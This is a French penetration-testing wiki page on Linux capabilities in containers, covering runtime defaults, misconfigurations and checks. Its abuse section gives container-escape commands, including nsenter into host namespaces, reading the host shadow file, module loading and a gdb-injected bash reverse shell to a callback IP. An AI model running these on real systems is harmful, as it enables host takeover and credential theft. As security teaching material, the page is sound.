# Capacités Linux dans les conteneurs

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Les capacités Linux sont l’un des éléments les plus importants de la sécurité des conteneurs, car elles répondent à une question subtile mais fondamentale : **que signifie réellement « root » dans un conteneur ?** Sur un système Linux classique, l’UID 0 impliquait historiquement un ensemble de privilèges très étendu. Dans les noyaux modernes, ces privilèges sont décomposés en unités plus petites appelées capacités. Un processus peut s’exécuter en tant que root tout en étant privé de nombreuses opérations puissantes si les capacités correspondantes ont été supprimées. <sup>[[1]](#references)</sup>

Les conteneurs reposent fortement sur cette distinction. De nombreuses charges de travail sont toujours lancées avec l’UID 0 dans le conteneur, pour des raisons de compatibilité ou de simplicité. Sans suppression de capacités, cela serait beaucoup trop dangereux. En supprimant des capacités, un processus root dans un conteneur peut toujours effectuer de nombreuses tâches ordinaires à l’intérieur du conteneur, tout en se voyant interdire des opérations plus sensibles du noyau. C’est pourquoi un shell de conteneur qui affiche `uid=0(root)` ne signifie pas automatiquement « root sur l’hôte » ni même « privilèges étendus sur le noyau ». Les ensembles de capacités déterminent la portée réelle de cette identité root.

Pour consulter la référence complète sur les capacités Linux et de nombreux exemples d’exploitation, voir :

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Fonctionnement

Les capacités sont suivies dans plusieurs ensembles, notamment les ensembles permitted, effective, inheritable, ambient et bounding. Pour de nombreuses évaluations de conteneurs, les détails exacts de la sémantique de chaque ensemble dans le noyau sont moins importants que la question pratique finale : **quelles opérations privilégiées ce processus peut-il effectuer actuellement, et quels gains de privilèges futurs restent possibles ?** <sup>[[1]](#references)</sup>

Cela importe, car de nombreuses techniques d’évasion sont en réalité des problèmes de capacités déguisés en problèmes de conteneurs. Une charge de travail avec `CAP_SYS_ADMIN` peut accéder à une quantité considérable de fonctionnalités du noyau qu’un processus root ordinaire dans un conteneur ne devrait pas pouvoir utiliser. Une charge de travail avec `CAP_NET_ADMIN` devient beaucoup plus dangereuse si elle partage également l’espace de noms réseau de l’hôte. Une charge de travail avec `CAP_SYS_PTRACE` devient beaucoup plus intéressante si elle peut voir les processus de l’hôte grâce au partage de l’espace de noms PID de l’hôte. Dans Docker ou Podman, cela peut apparaître sous la forme de `--pid=host` ; dans Kubernetes, cela apparaît généralement sous la forme de `hostPID: true`.

Autrement dit, l’ensemble de capacités ne peut pas être évalué isolément. Il doit être considéré en parallèle avec les espaces de noms, seccomp et la politique MAC.

## Laboratoire

Une façon très directe d’inspecter les capacités dans un conteneur est :

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Vous pouvez également comparer un conteneur plus restrictif à un conteneur auquel toutes les capacités ont été ajoutées :

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Pour voir l’effet d’un ajout limité, essayez de tout supprimer, puis de réajouter une seule capacité :

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Ces petites expériences montrent qu’un runtime ne se contente pas d’activer ou de désactiver un booléen appelé « privileged ». Il façonne la surface de privilèges réellement accessible au processus.

## Capacités à haut risque

Les capabilities ne deviennent des primitives d’escape que lorsque leur opération atteint une **ressource contrôlée par l’hôte**. Les combinaisons récurrentes à haut risque sont les suivantes :

- **`CAP_SYS_ADMIN`** associé à un PID de l’hôte, à un périphérique bloc ou à un chemin de contrôle du noyau accessible en écriture. Rejoindre un namespace de montage cible exige également `CAP_SYS_CHROOT` ; monter un système de fichiers basé sur un périphérique bloc exige `CAP_SYS_ADMIN` dans le namespace utilisateur initial.
- **`CAP_SYS_PTRACE`** associé à la visibilité des PID de l’hôte et à un processus hôte auquel on peut s’attacher. `CAP_SYS_ADMIN` n’est pas nécessaire pour une injection ptrace.
- **`CAP_DAC_OVERRIDE` ou `CAP_DAC_READ_SEARCH`** associé à un système de fichiers de l’hôte accessible. Ces capabilities contournent différents contrôles DAC, mais ne donnent pas accès à la vue du système de fichiers de l’hôte.
- **`CAP_SYS_MODULE`** dans le namespace utilisateur initial, associé à un module accepté et compatible avec le noyau. Les conteneurs Linux ordinaires partagent le noyau du nœud ; les runtimes basés sur des VM ou un noyau en espace utilisateur modifient cette frontière.
- **`CAP_MKNOD`** dans le namespace utilisateur initial, associé à un véritable périphérique hôte déjà autorisé par le device cgroup. Créer un nœud ne contourne pas le device cgroup.
- **`CAP_SYS_RAWIO`** associé à une interface de mémoire, de port d’E/S, PCI ou de contrôle de périphérique exposée et utilisable.
- **`CAP_SYS_BOOT`** associé au namespace PID initial pour redémarrer l’hôte, ou à un chemin kexec utilisable et autorisé pour remplacer le noyau.
- **`CAP_NET_ADMIN`** dans le namespace réseau de l’hôte pour contrôler directement l’état réseau du nœud. **`CAP_NET_RAW`** peut intervenir dans une évasion propre à un protocole, mais les sockets raw ne suffisent pas à obtenir un shell sur le nœud.

`CAP_SYS_CHROOT` n’est volontairement pas répertorié comme capability d’escape à part entière. Elle peut être nécessaire pour `setns()` vers un namespace de montage et faciliter l’utilisation d’une arborescence hôte déjà accessible, mais `chroot()` à lui seul n’expose pas cette arborescence et n’accorde pas de nouvelles permissions sur le système de fichiers. De même, `CAP_BPF` et `CAP_PERFMON` exposent de puissantes capacités de télémétrie et une surface d’attaque du noyau, mais, en l’absence d’une faille distincte dans le noyau, leurs opérations habituelles ne constituent pas des escapes de conteneur génériques.

## Utilisation par les runtimes

Docker, Podman, les stacks basées sur containerd et CRI-O utilisent tous des contrôles de capabilities, mais leurs valeurs par défaut et interfaces de gestion diffèrent. Docker les expose directement à l’aide de flags comme `--cap-drop` et `--cap-add`. Podman propose des contrôles similaires et les associe souvent à une exécution rootless comme couche de sécurité supplémentaire. Kubernetes permet d’ajouter ou de supprimer des capabilities via le `securityContext` du Pod ou du conteneur ; les runtimes de niveau inférieur expriment les ensembles résultants dans la configuration du runtime OCI. Les environnements de conteneurs système comme LXC et Incus s’appuient également sur le contrôle des capabilities, mais leur intégration plus étroite avec l’hôte peut inciter les opérateurs à assouplir davantage les valeurs par défaut que pour un conteneur applicatif. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Le même principe s’applique à tous ces environnements : une capability qu’il est techniquement possible d’accorder ne devrait pas forcément l’être. De nombreux incidents réels commencent lorsqu’un opérateur ajoute une capability simplement parce qu’une charge de travail a échoué avec une configuration plus stricte et que l’équipe cherchait une solution rapide.

## Mauvaises configurations

L’erreur la plus évidente est **`--cap-add=ALL`** dans les CLI de type Docker/Podman, mais ce n’est pas la seule. En pratique, le problème le plus courant est d’accorder une ou deux capabilities extrêmement puissantes, en particulier `CAP_SYS_ADMIN`, pour « faire fonctionner l’application », sans comprendre également les implications des namespaces, de seccomp et des montages. Autre problème fréquent : associer des capabilities supplémentaires au partage des namespaces de l’hôte. Dans Docker ou Podman, cela peut se présenter sous la forme de `--pid=host`, `--network=host` ou `--userns=host` ; dans Kubernetes, l’exposition équivalente apparaît généralement dans des paramètres de charge de travail comme `hostPID: true` ou `hostNetwork: true`. Chacune de ces combinaisons modifie ce que la capability peut réellement affecter.

Il est également fréquent de voir des administrateurs penser qu’une charge de travail reste réellement contrainte parce qu’elle n’est pas entièrement en mode `--privileged`. C’est parfois vrai, mais parfois sa configuration effective est déjà si proche du mode privilégié que cette distinction n’a plus d’importance en pratique.

## Abus

Commencez par consigner les ensembles effectifs, le mappage du namespace utilisateur, l’état de seccomp, les namespaces, les montages et les périphériques. Le nom d’une capability, sans ce contexte, ne prouve pas qu’il y a eu escape :

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN` : namespaces et périphériques bloc

Avec la visibilité des PID de l’hôte, `CAP_SYS_ADMIN` permet d’entrer dans les namespaces de l’hôte. L’opération sur le mount namespace nécessite également `CAP_SYS_CHROOT` dans le user namespace de l’appelant.

**Vérifier la capability et le confinement :**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Énumérez la cible :** confirmez le partage des PID de l’hôte à partir de la configuration du conteneur/Pod ou d’une liste de processus de l’hôte sans équivoque, puis inspectez les espaces de noms de la cible. Un PID 1 local existe aussi dans les espaces de noms PID privés ; sa seule présence ne prouve donc pas le partage des PID de l’hôte.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Exploiter le chemin de l’espace de noms :**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Les vérifications des capacités doivent réussir dans les espaces de noms utilisateur qui possèdent les cibles. `--pid=host` ou `hostPID: true` dans Kubernetes offre une visibilité, mais ne fournit pas les capacités.

Pour l’autre méthode via un périphérique bloc, **enumerate** les candidats, puis **exploit** le système de fichiers accessible en montant d’abord le candidat validé en lecture seule :

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Le nœud de périphérique doit exister, le cgroup des périphériques doit l’autoriser, et les montages de systèmes de fichiers bloc nécessitent `CAP_SYS_ADMIN` dans l’espace de noms utilisateur initial. Une racine de l’hôte déjà montée par bind sur `/host` donne accès à l’hôte **sans** `CAP_SYS_ADMIN` ; `chroot /host` n’est qu’une commodité et nécessite séparément `CAP_SYS_CHROOT`.

### Racine de l’hôte accessible : exécution directe depuis le système de fichiers

Si la racine de l’hôte est déjà montée sur `/host`, vérifiez d’abord le montage, puis utilisez directement l’accès existant. Cette méthode ne dépend pas de `CAP_SYS_ADMIN` :

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Si `chroot()` n’est pas disponible, mais que le binaire de l’hôte est compatible avec l’architecture et le chargeur du conteneur, il peut souvent être appelé via l’arborescence montée :

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Les lectures et écritures directes dans `/host` constituent déjà une compromission du système de fichiers de l’hôte. `chroot()` ou l’exécution d’un binaire de l’hôte rendent simplement cet accès plus pratique ; aucune de ces opérations ne crée le montage de l’hôte ni ne contourne un montage en lecture seule ou une politique MAC.

### `CAP_SYS_PTRACE` : host-process injection

Avec une visibilité sur les PID de l’hôte et `CAP_SYS_PTRACE` dans l’espace de noms utilisateur de la cible, GDB peut faire appeler `system()` par un processus de l’hôte autorisé. `CAP_SYS_ADMIN` n’est pas nécessaire.

**Vérifiez la capacité et les contrôles d’attachement :**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Énumérez les cibles jetables et sélectionnez-en une :** confirmez le partage des PID de l’hôte à partir de la configuration ou d’une liste de processus de nœud sans équivoque ; ne sélectionnez jamais le PID 1 ni un démon critique.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Exploiter le processus sélectionné :**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

La cible doit pouvoir être attachée et disposer d’un symbole `system()` utilisable ainsi que d’un chemin vers le payload Bash. Yama, un état non dumpable, seccomp, les user namespaces et la politique MAC peuvent bloquer la chaîne. GDB arrête la cible lorsqu’il y est attaché : utilisez donc uniquement un processus de laboratoire jetable.

### `CAP_DAC_OVERRIDE` et `CAP_DAC_READ_SEARCH` : fichiers hôte protégés

Ces capabilities n’exposent pas le système de fichiers hôte. Si `/host` est déjà un montage hôte, `CAP_DAC_READ_SEARCH` peut contourner les vérifications DAC de lecture/recherche et `CAP_DAC_OVERRIDE` peut en outre contourner les vérifications ordinaires d’écriture :

**Vérifier les capabilities :**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Énumérez le système de fichiers hôte exposé et les autorisations de la cible :**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Testez les bypasses de lecture et d’écriture dans un lab jetable** :

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Un montage en lecture seule et les règles LSM restent applicables. `CAP_DAC_READ_SEARCH` autorise également `open_by_handle_at()`, mais un breakout tel que Shocker nécessite aussi un descripteur de fichier de montage pour le même système de fichiers sous-jacent, des handles valides ou pouvant être découverts, une disposition du système de fichiers/stockage compatible, ainsi qu’une absence de blocage par le runtime ou le LSM. Cette capacité ne donne pas un accès arbitraire à tous les systèmes de fichiers situés en dehors de l’espace de noms de montage.

### `CAP_SYS_MODULE` : exécution dans le noyau partagé

Dans un conteneur Linux ordinaire, un module accepté s’exécute dans le noyau partagé de l’hôte.

**Vérifier la capacité et la portée de l’espace de noms utilisateur :**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Énumérer les prérequis au chargement des modules :**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit uniquement avec un module de preuve compatible et préalablement examiné, sur un nœud jetable :**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

La capability doit être effective dans l’espace de noms utilisateur initial. La version et la configuration du noyau, les signatures des modules, le mode de verrouillage, seccomp et la politique LSM doivent autoriser le chargement. Kata, gVisor, l’isolation Hyper-V et les runtimes similaires modifient la limite du noyau à laquelle le workload accède.

### `CAP_MKNOD` : créer un handle de périphérique autorisé

`CAP_MKNOD` crée un nœud de périphérique, mais ne contourne pas le cgroup des périphériques. La création de périphériques n’est pas isolée par espace de noms ; la capability doit donc être effective dans l’espace de noms utilisateur initial.

**Vérifier la capability et la portée de l’espace de noms utilisateur :**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Énumérez les périphériques réels, leurs numéros majeur/mineur et toute liste d’autorisation cgroup-v1 visible :**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploiter en lecture seule un candidat validé de la famille ext :**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Les autres systèmes de fichiers nécessitent un outil en lecture seule adapté ; monter le périphérique nécessite également `CAP_SYS_ADMIN`. `Operation not permitted` lors de l’ouverture du nœud créé indique généralement que le cgroup des périphériques le bloque toujours. Avec cgroup v2, l’accès aux périphériques est généralement contrôlé par BPF et aucun fichier `devices.list` n’existe ; la réussite de l’ouverture est donc le test décisif.

### `CAP_SYS_RAWIO` : interface d’E/S brute exposée

Il n’existe pas de charge utile générique portable : les adresses valides et les effets dépendent du matériel et de la configuration du noyau.

**Vérifier la capacité et la portée du user namespace :**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Énumérer les interfaces brutes exposées, le matériel et les pilotes :**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**N’exploitez qu’avec une preuve de concept approuvée pour le périphérique identifié et la plage d’adresses correspondante.** Si `/dev/mem` est l’interface approuvée pour le laboratoire, ce modèle démontre la divulgation de la mémoire du nœud sans en afficher le contenu :

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

L’adresse doit provenir de la cartographie matérielle du lab, car la lecture de certaines régions MMIO peut avoir des effets secondaires. Une commande générique d’écriture mémoire serait trompeuse et dangereuse : une même adresse peut être inoffensive sur une machine et contrôler le matériel ou la mémoire du kernel sur une autre. Les device cgroups, les permissions du système de fichiers, les restrictions strictes de `/dev/mem`, le kernel lockdown, la virtualisation et les politiques LSM empêchent souvent tout accès utile.

### `CAP_SYS_BOOT` : redémarrage d’un espace de noms ou remplacement du kernel

Dans un espace de noms PID privé, `reboot()` termine le processus init de cet espace de noms au lieu de redémarrer l’hôte. Un redémarrage de l’hôte nécessite donc l’espace de noms PID initial, généralement via le partage du PID de l’hôte. Un chemin kexec nécessite également une image kernel compatible et une politique lockdown/signature permissive :

**Vérifier la capability :**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Énumérez les prérequis de l’espace de noms PID et de kexec :** confirmez le partage des PID de l’hôte à partir de la configuration de la charge de travail, car un lien vers un espace de noms PID ne permet pas à lui seul de savoir s’il s’agit de l’espace de noms initial du nœud.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Exploiter uniquement lorsque le redémarrage d’un nœud de laboratoire jetable constitue explicitement l’exercice :**

```bash
sync
reboot -f
```

N’exécutez pas cette commande et ne chargez pas de noyau sur un nœud partagé dans le seul but de prouver la capacité. Dans un espace de noms PID privé, cela ne met fin qu’au processus init de cet espace de noms et ne démontre pas d’impact sur l’hôte.

### `CAP_NET_ADMIN` et `CAP_NET_RAW` : chemins réseau de l’hôte

`CAP_NET_ADMIN` n’affecte que l’espace de noms réseau actuel.

**Vérifiez les capacités et le confinement :**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Recensez le réseau actuel et confirmez l’utilisation du réseau de l’hôte dans la configuration de la charge de travail :**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Exercer `CAP_NET_ADMIN` de manière réversible : avec le réseau de l’hôte, l’interface temporaire est une interface du nœud.**

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` permet les sockets RAW et PACKET, mais ne fournit pas un shell hôte générique. Pour **recenser** la chaîne GCE documentée, vérifiez la route des métadonnées et capturez le trafic afin de déterminer si le trafic en clair de l’agent invité est observable :

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Si les prérequis correspondants sont réunis, **exploit** la chaîne spécifique à l’environnement décrite dans [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) : capture la requête et l’état de séquence, injecte la réponse forgée des métadonnées contenant une clé SSH, puis vérifie l’accès à l’hôte. Cette chaîne nécessitait les privilèges root, le réseau de l’hôte, `CAP_NET_ADMIN`, `CAP_NET_RAW`, du trafic en clair vers les métadonnées GCE et une requête de l’agent invité exposée à une condition de course ; les comportements modernes du transport ou de l’agent peuvent la faire échouer.

### Restrictions d’origine locale et adresses d’interface

Un service en écoute peut rejeter les connexions dont la source est `127.0.0.1`, tout en négligeant une autre adresse attribuée au même espace de noms réseau. Si le service est accessible via cette interface, compare une connexion via loopback à une connexion liée à une adresse locale existante autre que loopback. `CAP_NET_ADMIN` peut permettre de configurer une interface dans l’espace de noms actuel, mais n’est pas nécessaire si une adresse appropriée y est déjà attribuée. `CAP_NET_RAW` n’est pas nécessaire pour une connexion TCP ordinaire. Il s’agit d’un défaut de classification de l’adresse source, et non d’une évasion de conteneur ou d’une preuve que l’application autorisera une requête privilégiée.<sup>[[1]](#references)[[7]](#references)</sup>

Pour un service WebSocket en écoute, une réponse HTTP `101 Switching Protocols` valide confirme que la négociation initiale a abouti ; une erreur ultérieure au niveau applicatif peut indiquer que la connexion a atteint le gestionnaire. Aucune de ces réponses ne prouve que l’authentification ou l’opération demandée a réussi.<sup>[[8]](#references)</sup>

## Vérifications

L’objectif des vérifications des capabilities n’est pas seulement d’afficher les valeurs brutes, mais aussi de comprendre si le processus dispose de privilèges suffisants pour rendre dangereuses sa configuration actuelle des espaces de noms et des montages.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Ce qui est intéressant ici :

- `capsh --print` est le moyen le plus simple de repérer les capacités à haut risque, telles que `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
- La ligne `CapEff` dans `/proc/self/status` indique les capacités actuellement effectives, et pas seulement celles qui pourraient être disponibles dans d’autres ensembles.
- Un dump des capacités devient beaucoup plus important si le conteneur partage également les espaces de noms PID, réseau ou utilisateur de l’hôte, ou s’il dispose de montages hôte accessibles en écriture.

Après avoir collecté les informations brutes sur les capacités, l’étape suivante consiste à les interpréter. Vérifiez si le processus s’exécute en tant que root, si les espaces de noms utilisateur sont actifs, si des espaces de noms de l’hôte sont partagés, si seccomp est appliqué et si AppArmor ou SELinux restreint toujours le processus. Un ensemble de capacités ne représente qu’une partie de la situation, mais c’est souvent lui qui explique pourquoi un container breakout fonctionne alors qu’un autre échoue avec le même point de départ apparent.

## Paramètres par défaut des runtimes

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel fréquent |
| --- | --- | --- | --- |
| Docker Engine | Ensemble réduit de capacités par défaut | Docker conserve une liste d’autorisation par défaut des capacités et supprime les autres | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Ensemble réduit de capacités par défaut | Les conteneurs Podman sont non privilégiés par défaut et utilisent un modèle de capacités réduit | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hérite des paramètres par défaut du runtime, sauf modification | Si aucun `securityContext.capabilities` n’est spécifié, le conteneur reçoit l’ensemble de capacités par défaut du runtime | `securityContext.capabilities.add`, ne pas définir `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O sous Kubernetes | Généralement les paramètres par défaut du runtime | L’ensemble effectif dépend du runtime et de la spécification du Pod | Identique à la ligne Kubernetes ; la configuration OCI/CRI directe peut également ajouter explicitement des capacités |

Pour Kubernetes, le point important est que l’API ne définit pas un ensemble universel de capacités par défaut. Si le Pod n’ajoute ni ne supprime de capacités, la charge de travail hérite des paramètres par défaut du runtime de ce nœud.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - page du manuel Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - configuration des conteneurs Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - privilèges d’exécution et capacités Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Documentation Kubernetes - définir les capacités d’un conteneur](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Documentation Podman - `--cap-add` et `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Documentation Incus - sécurité](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - implémentation du protocole IPv4 sous Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - le protocole WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
